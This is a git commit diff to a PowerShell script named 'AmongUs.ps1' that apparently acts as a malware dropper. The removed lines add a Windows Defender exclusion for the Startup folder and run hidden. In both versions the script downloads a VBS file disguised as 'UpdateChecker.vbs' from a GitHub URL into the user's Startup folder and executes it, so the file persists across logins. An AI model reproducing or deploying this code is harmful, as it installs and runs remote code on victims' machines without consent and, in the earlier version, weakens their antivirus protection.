daa9cf8698266b8c73e1cb7ff51a798d459b7a36
AmjadBalls <155375827+AmjadBalls@users.noreply.github.com>
2025-01-23 20:51:01 +0200

    Update AmongUs.ps1

--- AmongUs.ps1
+++ AmongUs.ps1
@@ -1,4 +1,4 @@
-powershell -WindowStyle Hidden -Command "Add-MpPreference -ExclusionPath $env:USERPROFILE\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
-$url = 'https://raw.githubusercontent.com/AmjadBalls/Ramizjaber12/refs/heads/main/UpdateChecker.vbs'
-Invoke-WebRequest -Uri $url -OutFile "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\UpdateChecker.vbs" 
-Start-Process -FilePath "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\UpdateChecker.vbs" -WindowStyle Hidden
+$url = "https://raw.githubusercontent.com/AmjadBalls/Ramizjaber12/refs/heads/main/UpdateChecker.vbs"
+$dest = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\UpdateChecker.vbs"
+Invoke-WebRequest -Uri $url -OutFile $dest
+Start-Process $dest
